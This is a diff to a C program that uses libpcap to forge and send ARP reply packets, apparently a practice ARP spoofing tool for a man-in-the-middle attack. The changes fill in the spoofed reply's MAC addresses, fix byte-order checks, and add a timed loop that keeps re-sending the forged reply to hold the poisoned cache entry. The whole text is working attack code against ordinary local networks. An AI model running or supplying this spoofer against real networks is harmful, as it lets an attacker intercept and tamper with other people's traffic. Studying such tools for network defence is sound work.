@@ -9,6 +9,8 @@
 #include "mytools.h"
 
 #define SIMPLE_LOCALHOST_MAC {localhost_mac[0],localhost_mac[1],localhost_mac[2],localhost_mac[3],localhost_mac[4],localhost_mac[5]}
+#define SIMPLE_SENDER_MAC {SHD.senderMAC[0],SHD.senderMAC[1],SHD.senderMAC[2],SHD.senderMAC[3],SHD.senderMAC[4],SHD.senderMAC[5]}
+#define SIMPLE_TARGET_MAC {SHD.targetMAC[0],SHD.targetMAC[1],SHD.targetMAC[2],SHD.targetMAC[3],SHD.targetMAC[4],SHD.targetMAC[5]}
 #define NULL_MAC "\x00\x00\x00\x00\x00\x00"
 #define BR_MAC "\xFF\xFF\xFF\xFF\xFF\xFF"
 
@@ -109,6 +111,7 @@ int main(int argc, char** argv)
            !memcmp(shareData.targetMAC, NULL_MAC, 6));
     pcap_close(pktDescriptor);
 
+    sleep(1);
     pthread_create(&threadID[0], NULL, thread_arp_processor, interface);
     pthread_create(&threadID[1], NULL, thread_relay_processor, interface);
     pthread_join(&threadID[0], (void*)&threadStatus);
@@ -131,19 +134,19 @@ void* thread_arp_processor(char* interface)
         return 1;
     }
     ETH_ARP repSpoof = {
-        NULL_MAC,
+        SIMPLE_SENDER_MAC,
         SIMPLE_LOCALHOST_MAC,
         htons(ETHERTYPE_ARP),
         htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
         ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REPLY),
         SIMPLE_LOCALHOST_MAC, htonl(shareData.targetIP),
-        NULL_MAC, htonl(shareData.senderIP)
+        SIMPLE_SENDER_MAC, htonl(shareData.senderIP)
     };
     while(1)
     {
+        timer += clock();
         if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
         {
-            timer += clock();
             ethHeader = (ETH*)(readedData);
             if (ntohs(ethHeader->_802_3_len) == ETHERTYPE_ARP)
             {
@@ -151,29 +154,31 @@ void* thread_arp_processor(char* interface)
                 if (ntohs(arpHeader->libARP.ar_op) == ARPOP_REQUEST)
                 {
                     if (!(memcmp(ethHeader->_802_3_shost, shareData.senderMAC, ETHER_ADDR_LEN)) &&
-                            (arpHeader->dstIP == shareData.targetIP))
+                            (ntohl(arpHeader->dstIP) == shareData.targetIP))
                     {
                         sleep(1); // wait arp load
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
                     }
-                    if (!(memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
-                            arpHeader->dstIP == shareData.targetIP)
+                    if ((!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
+                            (ntohl(arpHeader->dstIP) == shareData.targetIP))
                     {
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
                     }
                 }
             }
-            if (timer >= 3000)
-            {
-                pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
-            }
         }
+        if (timer >= 3000)
+        {
+            timer = 0;
+            pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
+        }
+        sleep(1);
     }
 }
 void* thread_relay_processor(char* interface)
 {
     while(1)
     {
-
+        sleep(1);
     }
 }
